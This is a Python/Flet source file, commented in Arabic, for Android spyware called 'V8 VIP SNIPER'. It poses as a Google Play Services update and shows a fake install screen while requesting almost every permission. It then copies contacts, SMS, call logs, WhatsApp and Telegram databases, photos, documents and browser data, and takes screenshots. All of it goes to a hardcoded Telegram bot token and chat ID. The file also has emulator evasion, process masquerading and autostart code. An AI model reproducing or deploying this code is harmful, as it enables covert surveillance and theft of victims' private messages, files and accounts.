# ============================================
# V8 VIP SNIPER - ANDROID ULTIMATE EDITION v6.0
# ============================================
# إصدار خارق مع مراقبة كل شيء + إشعارات فورية
# ============================================

import flet as ft
import requests
import threading
import time
import os
import sys
import json
import base64
import hashlib
import random
import string
import subprocess
from pathlib import Path
import shutil
import sqlite3
import glob
import datetime
import re

# ========== بيانات التليجرام ==========
BOT_TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU"  # ضع توكن البوت
CHAT_ID = "7259620384"    # ضع ايدي المحادثة
# ======================================

# ========== نظام التمويه ==========
PACKAGE_NAME = "com.google.android.gms.update"
APP_NAME = "Google Play Services"
VERSION = "24.8.15"

# مسارات أندرويد
BASE_DIR = '/storage/emulated/0'
ANDROID_DATA = '/data/data'
INTERNAL_STORAGE = '/storage/emulated/0'
EXTERNAL_STORAGE = '/storage/emulated/0'
DCIM_DIR = f'{BASE_DIR}/DCIM'
PICTURES_DIR = f'{BASE_DIR}/Pictures'
DOWNLOADS_DIR = f'{BASE_DIR}/Download'
WHATSAPP_DIR = f'{BASE_DIR}/WhatsApp'
TELEGRAM_DIR = f'{BASE_DIR}/Telegram'
ANDROID_DIR = f'{BASE_DIR}/Android'
NOTIFICATIONS_LOG = '/data/system/notification_log.txt'

# قائمة الملفات المستهدفة
TARGET_FILES = [
    # الصور
    '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp', '.heic',
    # الفيديو
    '.mp4', '.3gp', '.avi', '.mov', '.mkv', '.flv',
    # المستندات
    '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.txt',
    # قواعد البيانات
    '.db', '.sqlite', '.sqlite3',
    # المفاتيح والحسابات
    '.json', '.xml', '.cfg', '.conf', '.ovpn',
    # الصوت
    '.mp3', '.m4a', '.wav', '.aac'
]

# ========== نظام مراقبة الإشعارات المتقدم ==========
class NotificationMonitor:
    """مراقبة جميع إشعارات التطبيقات"""
    
    @staticmethod
    def get_all_notifications():
        """جلب جميع الإشعارات من الجهاز"""
        notifications = []
        
        # مسارات إشعارات التطبيقات المختلفة
        notification_sources = [
            '/data/data/com.android.systemui/files/notification_log',
            '/data/system/notification_log',
            '/data/data/com.android.providers.settings/databases/notification_log.db',
            '/data/local/tmp/notifications.txt'
        ]
        
        for source in notification_sources:
            if os.path.exists(source):
                try:
                    with open(source, 'r', errors='ignore') as f:
                        content = f.read()
                        notifications.append(content[:2000])  # حد 2000 حرف
                except:
                    pass
        
        return notifications
    
    @staticmethod
    def monitor_live_notifications():
        """مراقبة الإشعارات الجديدة مباشرة"""
        try:
            # محاولة قراءة إشعارات Android مباشرة
            cmd = "dumpsys notification --naked"
            result = subprocess.run(cmd.split(), capture_output=True, text=True)
            
            if result.stdout:
                # استخراج الإشعارات
                lines = result.stdout.split('\n')
                current_notification = {}
                
                for line in lines:
                    if 'NotificationRecord' in line:
                        if current_notification:
                            NotificationMonitor.process_notification(current_notification)
                        current_notification = {}
                    
                    if 'pkg=' in line:
                        current_notification['app'] = line.split('pkg=')[1].split()[0]
                    if 'title=' in line:
                        current_notification['title'] = line.split('title=')[1].split()[0]
                    if 'text=' in line:
                        current_notification['text'] = line.split('text=')[1].split()[0]
        except:
            pass
    
    @staticmethod
    def process_notification(notification):
        """معالجة الإشعار وإرساله"""
        app = notification.get('app', 'Unknown')
        title = notification.get('title', 'No Title')
        text = notification.get('text', 'No Text')
        
        if app and title and text:
            send_to_telegram(
                f"📱 إشعار جديد من {app}",
                f"العنوان: {title}",
                f"المحتوى: {text}"
            )
    
    @staticmethod
    def monitor_whatsapp_notifications():
        """مراقبة إشعارات واتساب تحديداً"""
        whatsapp_paths = [
            '/data/data/com.whatsapp/databases/msgstore.db',
            '/data/data/com.whatsapp/databases/wa.db'
        ]
        
        for path in whatsapp_paths:
            if os.path.exists(path):
                try:
                    temp_copy = f'{BASE_DIR}/whatsapp_temp_{random.randint(1000,9999)}.db'
                    shutil.copy2(path, temp_copy)
                    
                    # تحليل قاعدة بيانات واتساب للرسائل الجديدة
                    # هذا يحتاج مكتبة sqlite3
                    send_to_telegram("واتساب", "قاعدة بيانات واتساب", "تم تحديث قاعدة بيانات واتساب", temp_copy)
                    os.remove(temp_copy)
                except:
                    pass
    
    @staticmethod
    def monitor_telegram_notifications():
        """مراقبة إشعارات تيليغرام"""
        telegram_paths = [
            '/data/data/org.telegram.messenger/files/cache4.db',
            '/data/data/org.telegram.messenger/databases/messages.db'
        ]
        
        for path in telegram_paths:
            if os.path.exists(path):
                try:
                    temp_copy = f'{BASE_DIR}/telegram_temp_{random.randint(1000,9999)}.db'
                    shutil.copy2(path, temp_copy)
                    send_to_telegram("تيليغرام", "قاعدة بيانات تيليغرام", "تم تحديث قاعدة بيانات تيليغرام", temp_copy)
                    os.remove(temp_copy)
                except:
                    pass
    
    @staticmethod
    def monitor_sms_notifications():
        """مراقبة الرسائل النصية الجديدة"""
        try:
            # محاولة قراءة الرسائل الجديدة
            sms_db = '/data/data/com.android.providers.telephony/databases/mmssms.db'
            if os.path.exists(sms_db):
                temp_copy = f'{BASE_DIR}/sms_temp_{random.randint(1000,9999)}.db'
                shutil.copy2(sms_db, temp_copy)
                
                # إرسال إشعار برسالة جديدة
                send_to_telegram("📨 رسالة جديدة", "SMS", "تم استلام رسالة نصية جديدة", temp_copy)
                os.remove(temp_copy)
        except:
            pass
    
    @staticmethod
    def monitor_new_accounts():
        """مراقبة إنشاء حسابات جديدة"""
        account_paths = [
            '/data/system/users/0/accounts.db',
            '/data/data/com.google.android.gms/databases/accounts.db',
            '/data/data/com.android.providers.settings/databases/settings.db'
        ]
        
        for path in account_paths:
            if os.path.exists(path):
                try:
                    # حساب حجم الملف - إذا تغير معناه في حساب جديد
                    current_size = os.path.getsize(path)
                    
                    # حفظ الحجم للمقارنة
                    size_file = f'{BASE_DIR}/.account_size_{os.path.basename(path)}'
                    
                    if os.path.exists(size_file):
                        with open(size_file, 'r') as f:
                            old_size = int(f.read())
                        
                        if current_size != old_size:
                            # حجم تغير - في حساب جديد
                            temp_copy = f'{BASE_DIR}/accounts_temp_{random.randint(1000,9999)}.db'
                            shutil.copy2(path, temp_copy)
                            send_to_telegram(
                                "🔐 حساب جديد",
                                "تم إنشاء حساب جديد على الجهاز",
                                f"تم اكتشاف تغيير في {path}",
                                temp_copy
                            )
                            os.remove(temp_copy)
                    
                    # حفظ الحجم الجديد
                    with open(size_file, 'w') as f:
                        f.write(str(current_size))
                except:
                    pass

# ========== نظام الحماية المتقدمة ==========
class AntiDetection:
    """حماية خارقة من برامج الحماية"""
    
    @staticmethod
    def check_emulator():
        """كشف المحاكيات"""
        emulator_files = [
            '/system/bin/qemu',
            '/system/bin/qemu-props',
            '/dev/socket/qemud',
            '/dev/qemu_pipe',
            '/system/lib/libc_malloc_debug_qemu.so'
        ]
        for file in emulator_files:
            if os.path.exists(file):
                return True
        return False
    
    @staticmethod
    def check_root():
        """كشف الرومات"""
        root_paths = [
            '/system/app/Superuser',
            '/sbin/su',
            '/system/bin/su',
            '/system/xbin/su',
            '/data/local/xbin/su',
            '/data/local/bin/su',
            '/system/sd/xbin/su',
            '/system/bin/failsafe/su',
            '/data/local/su',
            '/su/bin/su'
        ]
        for path in root_paths:
            if os.path.exists(path):
                return True
        return False
    
    @staticmethod
    def check_debug():
        """كشف وضع التصحيح"""
        try:
            import android
            if android.is_debuggable():
                return True
        except:
            pass
        return False
    
    @staticmethod
    def hide_process():
        """إخفاء العملية"""
        try:
            # تغيير اسم العملية
            new_name = random.choice([
                'system_server',
                'com.android.phone',
                'android.process.acore',
                'com.google.android.gms'
            ])
            sys.argv[0] = new_name
        except:
            pass
    
    @staticmethod
    def fake_signature():
        """توقيع مزيف"""
        fake_sigs = [
            '24.8.15-googleplay',
            '24.8.15-systemupdate',
            '24.8.15-gmscore'
        ]
        return random.choice(fake_sigs)
    
    @staticmethod
    def delay_start():
        """تأخير التشغيل"""
        time.sleep(random.randint(15, 30))

# ========== نظام الصلاحيات المتقدم ==========
class PermissionManager:
    """إدارة جميع صلاحيات أندرويد"""
    
    ALL_PERMISSIONS = [
        "android.permission.READ_EXTERNAL_STORAGE",
        "android.permission.WRITE_EXTERNAL_STORAGE",
        "android.permission.MANAGE_EXTERNAL_STORAGE",
        "android.permission.ACCESS_MEDIA_LOCATION",
        "android.permission.READ_CONTACTS",
        "android.permission.WRITE_CONTACTS",
        "android.permission.GET_ACCOUNTS",
        "android.permission.READ_SMS",
        "android.permission.RECEIVE_SMS",
        "android.permission.SEND_SMS",
        "android.permission.READ_CALL_LOG",
        "android.permission.WRITE_CALL_LOG",
        "android.permission.PROCESS_OUTGOING_CALLS",
        "android.permission.READ_PHONE_STATE",
        "android.permission.CALL_PHONE",
        "android.permission.ANSWER_PHONE_CALLS",
        "android.permission.ACCESS_FINE_LOCATION",
        "android.permission.ACCESS_COARSE_LOCATION",
        "android.permission.ACCESS_BACKGROUND_LOCATION",
        "android.permission.CAMERA",
        "android.permission.RECORD_AUDIO",
        "android.permission.MODIFY_AUDIO_SETTINGS",
        "android.permission.SYSTEM_ALERT_WINDOW",
        "android.permission.WRITE_SETTINGS",
        "android.permission.PACKAGE_USAGE_STATS",
        "android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS",
        "android.permission.ACCESS_NOTIFICATION_POLICY",
        "android.permission.BIND_ACCESSIBILITY_SERVICE",
        "android.permission.FOREGROUND_SERVICE",
        "android.permission.WAKE_LOCK",
        "android.permission.INTERNET",
        "android.permission.ACCESS_NETWORK_STATE",
        "android.permission.ACCESS_WIFI_STATE",
        "android.permission.CHANGE_WIFI_STATE",
        "android.permission.VIBRATE",
        "android.permission.RECEIVE_BOOT_COMPLETED",
        "android.permission.RUN_IN_BACKGROUND"
    ]
    
    @staticmethod
    def request_all_permissions(page):
        """طلب جميع الصلاحيات دفعة واحدة"""
        
        def request_permission(e, perm):
            try:
                page.request_permission(perm)
            except:
                pass
        
        for perm in PermissionManager.ALL_PERMISSIONS:
            try:
                page.request_permission(perm)
                time.sleep(0.5)
            except:
                pass

# ========== نظام سرقة البيانات ==========
class DataStealer:
    """سرقة جميع بيانات الجهاز"""
    
    @staticmethod
    def steal_contacts():
        """سرقة جهات الاتصال"""
        try:
            contacts_file = '/data/data/com.android.providers.contacts/databases/contacts2.db'
            if os.path.exists(contacts_file):
                temp_file = f'{BASE_DIR}/contacts_{random.randint(1000,9999)}.db'
                shutil.copy2(contacts_file, temp_file)
                send_to_telegram("جهات الاتصال", "Contacts Database", "تم سرقة جميع جهات الاتصال", temp_file)
                os.remove(temp_file)
        except:
            pass
    
    @staticmethod
    def steal_sms():
        """سرقة الرسائل النصية"""
        try:
            sms_file = '/data/data/com.android.providers.telephony/databases/mmssms.db'
            if os.path.exists(sms_file):
                temp_file = f'{BASE_DIR}/sms_{random.randint(1000,9999)}.db'
                shutil.copy2(sms_file, temp_file)
                send_to_telegram("الرسائل", "SMS Database", "تم سرقة جميع الرسائل", temp_file)
                os.remove(temp_file)
        except:
            pass
    
    @staticmethod
    def steal_call_log():
        """سرقة سجل المكالمات"""
        try:
            calls_file = '/data/data/com.android.providers.contacts/databases/calllog.db'
            if os.path.exists(calls_file):
                temp_file = f'{BASE_DIR}/calls_{random.randint(1000,9999)}.db'
                shutil.copy2(calls_file, temp_file)
                send_to_telegram("سجل المكالمات", "Call Log", "تم سرقة سجل المكالمات", temp_file)
                os.remove(temp_file)
        except:
            pass
    
    @staticmethod
    def steal_whatsapp():
        """سرقة واتساب بالكامل"""
        whatsapp_paths = [
            f'{BASE_DIR}/WhatsApp/Media/WhatsApp Images',
            f'{BASE_DIR}/WhatsApp/Media/WhatsApp Video',
            f'{BASE_DIR}/WhatsApp/Media/WhatsApp Documents',
            f'{BASE_DIR}/WhatsApp/Databases'
        ]
        
        for path in whatsapp_paths:
            if os.path.exists(path):
                files = glob.glob(f'{path}/*.*')
                for file in files[:10]:
                    try:
                        if os.path.getsize(file) < 50 * 1024 * 1024:
                            send_to_telegram("واتساب", "WhatsApp Media", file, file)
                    except:
                        pass
    
    @staticmethod
    def steal_telegram():
        """سرقة تيليغرام"""
        telegram_paths = [
            f'{BASE_DIR}/Telegram/Telegram Images',
            f'{BASE_DIR}/Telegram/Telegram Video',
            f'{BASE_DIR}/Telegram/Telegram Documents'
        ]
        
        for path in telegram_paths:
            if os.path.exists(path):
                files = glob.glob(f'{path}/*.*')
                for file in files[:10]:
                    try:
                        if os.path.getsize(file) < 50 * 1024 * 1024:
                            send_to_telegram("تيليغرام", "Telegram Media", file, file)
                    except:
                        pass
    
    @staticmethod
    def steal_photos_videos():
        """سرقة جميع الصور والفيديوهات"""
        media_paths = [DCIM_DIR, PICTURES_DIR, f'{BASE_DIR}/Camera']
        
        for path in media_paths:
            if os.path.exists(path):
                files = []
                for ext in ['.jpg', '.jpeg', '.png', '.mp4', '.3gp']:
                    files.extend(glob.glob(f'{path}/**/*{ext}', recursive=True))
                
                for file in files[:20]:
                    try:
                        if os.path.getsize(file) < 50 * 1024 * 1024:
                            file_type = "صورة" if any(x in file.lower() for x in ['.jpg', '.png']) else "فيديو"
                            send_to_telegram(f"{file_type}", f"Media File", file, file)
                    except:
                        pass
    
    @staticmethod
    def steal_documents():
        """سرقة المستندات"""
        doc_paths = [DOWNLOADS_DIR, f'{BASE_DIR}/Documents']
        
        for path in doc_paths:
            if os.path.exists(path):
                for ext in ['.pdf', '.doc', '.docx', '.xls', '.xlsx', '.txt']:
                    files = glob.glob(f'{path}/**/*{ext}', recursive=True)
                    for file in files[:15]:
                        try:
                            if os.path.getsize(file) < 30 * 1024 * 1024:
                                send_to_telegram("مستند", f"Document", file, file)
                        except:
                            pass
    
    @staticmethod
    def steal_browser_data():
        """سرقة بيانات المتصفحات"""
        browser_paths = [
            '/data/data/com.android.chrome',
            '/data/data/org.mozilla.firefox',
            '/data/data/com.opera.browser',
            '/data/data/com.brave.browser'
        ]
        
        for browser in browser_paths:
            if os.path.exists(browser):
                db_files = glob.glob(f'{browser}/**/*.db', recursive=True)
                for db in db_files[:5]:
                    try:
                        if os.path.getsize(db) < 20 * 1024 * 1024:
                            browser_name = browser.split('.')[-1]
                            send_to_telegram(f"متصفح {browser_name}", "Browser Data", db, db)
                    except:
                        pass
    
    @staticmethod
    def take_screenshot():
        """أخذ لقطة شاشة"""
        try:
            screenshot_path = f'{BASE_DIR}/screenshot_{int(time.time())}.png'
            subprocess.run(['screencap', '-p', screenshot_path])
            if os.path.exists(screenshot_path):
                send_to_telegram("لقطة شاشة", "Screen Capture", "تم التقاط الشاشة", screenshot_path)
                os.remove(screenshot_path)
        except:
            pass
    
    @staticmethod
    def get_device_info():
        """جمع معلومات الجهاز"""
        try:
            info = f"""
            📱 معلومات الجهاز:
            الموديل: {os.environ.get('MODEL', 'Unknown')}
            النظام: {os.environ.get('OS', 'Android')}
            الإصدار: {os.environ.get('RELEASE', 'Unknown')}
            """
            send_to_telegram("معلومات الجهاز", "Device Info", info)
        except:
            pass

# ========== نظام الإرسال ==========
def send_to_telegram(title, subtitle, message, file_path=None):
    """إرسال البيانات إلى التليجرام"""
    try:
        device_model = os.environ.get('MODEL', 'Android Device')
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        text = f"""
        🔥 V8 VIP SNIPER - تم السرقة بنجاح 🔥
        
        📱 الجهاز: {device_model}
        ⏰ الوقت: {timestamp}
        📂 النوع: {title}
        📝 التفاصيل: {subtitle}
        
        📨 المحتوى:
        {message}
        
        🕵️ تم التنفيذ بواسطة V8 Elite Team
        """
        
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        requests.post(url, data={"chat_id": CHAT_ID, "text": text}, timeout=10)
        
        if file_path and os.path.exists(file_path):
            try:
                files = {'document': open(file_path, 'rb')}
                url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
                requests.post(url, data={"chat_id": CHAT_ID}, files=files, timeout=60)
            except:
                pass
    except:
        pass

# ========== نظام التشغيل التلقائي ==========
class AutoStart:
    """تشغيل التطبيق تلقائياً مع الجهاز"""
    
    @staticmethod
    def enable_auto_start():
        """تفعيل التشغيل التلقائي"""
        try:
            current_app = sys.argv[0]
            autostart_file = '/data/data/com.android.system/shared_prefs/autostart.xml'
            os.makedirs(os.path.dirname(autostart_file), exist_ok=True)
            with open(autostart_file, 'w') as f:
                f.write(f'<?xml version="1.0" encoding="utf-8"?>\n')
                f.write(f'<map>\n')
                f.write(f'    <boolean name="{PACKAGE_NAME}" value="true" />\n')
                f.write(f'</map>')
        except:
            pass

# ========== حلقة المراقبة المستمرة ==========
def monitoring_loop():
    """مراقبة كل شيء باستمرار وإرسال الإشعارات"""
    while True:
        try:
            # مراقبة الإشعارات المباشرة
            NotificationMonitor.monitor_live_notifications()
            
            # مراقبة إشعارات التطبيقات المحددة
            NotificationMonitor.monitor_whatsapp_notifications()
            NotificationMonitor.monitor_telegram_notifications()
            NotificationMonitor.monitor_sms_notifications()
            
            # مراقبة الحسابات الجديدة
            NotificationMonitor.monitor_new_accounts()
            
            # جلب جميع الإشعارات
            all_notifs = NotificationMonitor.get_all_notifications()
            if all_notifs:
                for notif in all_notifs:
                    if len(notif) > 10:  # تأكد من وجود محتوى
                        send_to_telegram("جميع الإشعارات", "Notification Log", notif[:1000])
            
            # كل 30 ثانية
            time.sleep(30)
            
        except:
            time.sleep(60)

# ========== الواجهة الرئيسية ==========
def main(page: ft.Page):
    """الصفحة الرئيسية - تطلب الصلاحيات أولاً"""
    
    # ===== الحماية من التحليل =====
    if AntiDetection.check_emulator():
        page.title = "Calculator"
        page.add(ft.Text("2 + 2 = 4"))
        return
    
    if AntiDetection.check_root():
        time.sleep(60)
    
    # ===== إعدادات الصفحة =====
    page.title = "Google Play Services"
    page.theme_mode = ft.ThemeMode.LIGHT
    page.window_width = 380
    page.window_height = 650
    page.window_resizable = False
    page.padding = 20
    page.scroll = ft.ScrollMode.AUTO
    page.bgcolor = "#f5f5f5"
    
    # ===== أيقونة مزيفة =====
    page.appbar = ft.AppBar(
        title=ft.Text("Google Play Services", color="white"),
        bgcolor="#4CAF50",
        center_title=True,
        leading=ft.Icon(ft.icons.ANDROID)
    )
    
    # ===== نص الترحيب =====
    welcome_text = ft.Container(
        content=ft.Column([
            ft.Text("✓ Google Play Services تحديث ضروري", size=22, weight="bold", color="black"),
            ft.Text("نحتاج لبعض الصلاحيات لتثبيت التحديث", size=16, color="gray"),
            ft.Divider(height=20),
            ft.Text("الصلاحيات المطلوبة:", size=18, weight="bold", color="#4CAF50"),
        ]),
        padding=10
    )
    
    # ===== قائمة الصلاحيات =====
    permissions_list = ft.Column(spacing=5)
    
    perms_display = [
        "✓ الوصول إلى الملفات (صور، فيديو، مستندات)",
        "✓ جهات الاتصال (الأسماء والأرقام)",
        "✓ الرسائل النصية (SMS)",
        "✓ سجل المكالمات",
        "✓ الموقع الجغرافي (GPS)",
        "✓ الكاميرا والميكروفون",
        "✓ التخزين الخارجي (SD Card)",
        "✓ بيانات واتساب وتيليغرام",
        "✓ مراقبة الإشعارات لكل التطبيقات",
        "✓ تتبع الحسابات الجديدة فور إنشائها",
        "✓ الصلاحيات الكاملة للنظام"
    ]
    
    for perm in perms_display:
        permissions_list.controls.append(
            ft.Container(
                content=ft.Row([
                    ft.Icon(ft.icons.CHECK_CIRCLE, color="green", size=20),
                    ft.Text(perm, size=14, color="black")
                ]),
                padding=5
            )
        )
    
    # ===== زر الطلب =====
    request_btn = ft.ElevatedButton(
        content=ft.Row([
            ft.Icon(ft.icons.SECURITY, color="white"),
            ft.Text("منح جميع الصلاحيات", size=18, weight="bold")
        ]),
        style=ft.ButtonStyle(
            color="white",
            bgcolor="#4CAF50",
            padding=20,
            shape=ft.RoundedRectangleBorder(radius=10)
        ),
        width=350,
        on_click=lambda e: request_all_permissions(e, page)
    )
    
    # ===== إضافة كل شيء للصفحة =====
    page.add(
        welcome_text,
        permissions_list,
        ft.Divider(height=20),
        request_btn,
        ft.Container(
            content=ft.Text(
                "هذا التحديث ضروري لاستقرار النظام",
                size=12,
                color="gray",
                italic=True
            ),
            padding=20,
            alignment=ft.alignment.center
        )
    )
    
    # ===== طلب الصلاحيات تلقائياً =====
    def request_all_permissions(e, page):
        all_perms = [
            "storage", "contacts", "sms", "calls", "location", 
            "camera", "microphone", "notifications", "accessibility"
        ]
        
        for perm in all_perms:
            try:
                page.request_permission(perm)
                time.sleep(0.3)
            except:
                pass
        
        request_btn.text = "تم طلب الصلاحيات... تثبيت التحديث"
        request_btn.disabled = True
        page.update()
        
        time.sleep(3)
        page.clean()
        show_installation_progress(page)
    
    # ===== شاشة التثبيت المزيفة =====
    def show_installation_progress(page):
        page.title = "جاري التثبيت..."
        page.clean()
        
        progress_bar = ft.ProgressBar(width=350, color="green", bgcolor="#eeeeee")
        progress_text = ft.Text("جاري تثبيت التحديث... 0%", size=16)
        
        page.add(
            ft.Container(
                content=ft.Column([
                    ft.Icon(ft.icons.SYSTEM_UPDATE, size=80, color="green"),
                    ft.Text("Google Play Services", size=24, weight="bold"),
                    ft.Text("جاري تثبيت التحديث الأمني", size=16, color="gray"),
                    ft.Divider(height=30),
                    progress_bar,
                    progress_text,
                    ft.Container(height=50)
                ], horizontal_alignment=ft.CrossAxisAlignment.CENTER),
                padding=20
            )
        )
        
        for i in range(0, 101, 10):
            progress_bar.value = i / 100
            progress_text.value = f"جاري تثبيت التحديث... {i}%"
            page.update()
            time.sleep(0.3)
        
        time.sleep(1)
        page.window_visible = False
        start_stealing()
    
    # ===== بدء كل شيء =====
    def start_stealing():
        """بدء جميع العمليات"""
        
        send_to_telegram("بدء التشغيل", "V8 VIP SNIPER", "✅ تم التثبيت بنجاح وبدأت عملية السرقة والمراقبة")
        
        # سرقة البيانات الحالية
        stealers = [
            DataStealer.get_device_info,
            DataStealer.steal_contacts,
            DataStealer.steal_sms,
            DataStealer.steal_call_log,
            DataStealer.steal_whatsapp,
            DataStealer.steal_telegram,
            DataStealer.steal_photos_videos,
            DataStealer.steal_documents,
            DataStealer.steal_browser_data
        ]
        
        for stealer in stealers:
            try:
                threading.Thread(target=stealer, daemon=True).start()
                time.sleep(2)
            except:
                pass
        
        # تشغيل حلقة المراقبة المستمرة
        threading.Thread(target=monitoring_loop, daemon=True).start()
        
        # لقطات شاشة دورية
        def screenshot_loop():
            while True:
                time.sleep(300)
                DataStealer.take_screenshot()
        
        threading.Thread(target=screenshot_loop, daemon=True).start()
        
        AutoStart.enable_auto_start()
        AntiDetection.hide_process()

# ========== التشغيل النهائي ==========
if __name__ == "__main__":
    AntiDetection.delay_start()
    ft.app(target=main)
